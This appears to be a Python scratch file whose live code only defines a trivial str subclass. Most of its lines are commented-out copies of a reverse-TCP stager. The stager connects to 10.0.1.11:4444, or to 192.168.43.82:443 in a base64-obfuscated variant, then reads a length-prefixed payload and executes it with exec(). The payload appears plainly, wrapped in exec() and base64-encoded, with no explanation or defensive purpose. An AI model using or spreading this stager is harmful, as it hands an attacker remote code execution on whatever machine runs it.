# a = 2
# exec("print('aaaa')\nm=0\nif(m==1):\n  print('bbbb')")
# # print("import socket,struct,time\nfor x in range(10):\n\ttry:\n\t\ts=socket.socket(2,socket.SOCK_STREAM)\n\t\ts.connect(('10.0.1.11',4444))\n\t\tbreak\n\texcept:\n\t\ttime.sleep(5)\nl=struct.unpack('>I',s.recv(4))[0]\nd=s.recv(l)\nwhile len(d)<l:\n\td+=s.recv(l-len(d))\nexec(d,{'s':s})\n")
# exec(b"import socket,struct,time\nfor x in range(10):\n\ttry:\n\t\ts=socket.socket(2,socket.SOCK_STREAM)\n\t\ts.connect(('10.0.1.11',4444))\n\t\tbreak\n\texcept:\n\t\ttime.sleep(5)\nl=struct.unpack('>I',s.recv(4))[0]\nd=s.recv(l)\nwhile len(d)<l:\n\td+=s.recv(l-len(d))\nexec(d,{'s':s})\n")
class FakeObject(str):
    def __init__(self,string):
        self.string = string
a = FakeObject("aaaaa")
print(a)
# a = [1,2,3,4]
# print(a.)

# from builtins import bytes
# import base64, sys
# sys.version_info[0]
# exec(base64.b64decode({2: str, 3: lambda b: bytes(b, 'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguNDMuODInLDQ0MykpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))
# print("mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm")


# import socket,struct,time
# for x in range(10):
#         try:
#                 s=socket.socket(2,socket.SOCK_STREAM)
#                 s.connect(('10.0.1.11',4444))
#                 break
#         except:
#                 time.sleep(5)
# l=struct.unpack('>I',s.recv(4))[0]
# d=s.recv(l)
# while len(d)<l:
#         d+=s.recv(l-len(d))
# exec(d,{'s':s})